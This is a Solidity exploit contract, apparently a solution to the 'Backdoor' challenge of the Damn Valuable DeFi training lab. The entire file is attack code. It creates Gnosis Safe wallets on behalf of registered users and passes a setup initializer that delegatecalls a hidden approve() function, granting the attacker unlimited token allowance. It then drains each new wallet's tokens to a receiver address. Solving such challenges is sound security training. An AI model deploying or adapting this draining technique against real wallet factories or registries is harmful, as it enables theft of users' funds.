// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract RektBackdoor {
    address public receiver;

    DamnValuableToken public token;
    GnosisSafeProxyFactory public factory;
    address public singleton;
    IProxyCreationCallback public callback;
    address[] public users;

    constructor(
        address _receiver,
        address tokenAddress,
        address factoryAddress,
        address _singleton,
        address callbackAddress,
        address[] memory _users
    ) {
        receiver = _receiver;
        token = DamnValuableToken(tokenAddress);
        factory = GnosisSafeProxyFactory(factoryAddress);
        singleton = _singleton;
        callback = IProxyCreationCallback(callbackAddress);
        users = _users;
    }

    function approve(address spender, address token) external {
        IERC20(token).approve(spender, type(uint256).max);
    }

    function rekt() external {
        bytes memory encodedApprove = abi.encodeWithSignature(
            "approve(address,address)",
            address(this),
            address(token)
        );

        for (uint8 i = 0; i < users.length; i++) {
            address user = users[i];
            address[] memory owners = new address[](1);
            owners[0] = user;
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                encodedApprove,
                address(0),
                0,
                0,
                0
            );

            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                singleton,
                initializer,
                0,
                callback
            );

            token.transferFrom(
                address(proxy),
                receiver,
                token.balanceOf(address(proxy))
            );
        }
    }
}
